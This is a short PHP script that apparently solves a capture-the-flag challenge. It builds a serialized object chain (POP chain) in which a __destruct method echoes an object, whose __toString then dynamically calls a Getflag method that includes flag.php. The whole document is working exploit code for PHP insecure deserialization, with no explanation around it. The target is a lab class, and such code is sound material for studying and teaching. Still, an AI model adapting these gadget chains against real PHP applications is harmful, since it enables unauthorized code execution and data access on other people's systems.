<?php
class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';
    public function __construct()
    {
        $this->admin='w44m';
        $this->passwd='08067';
    }
    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
        }
    }
}
class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}
class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}
$a=new w22m();
$a->w00m=new w33m();
$a->w00m->w00m=new w44m();
$a->w00m->w22m="Getflag";
echo serialize($a);
?>
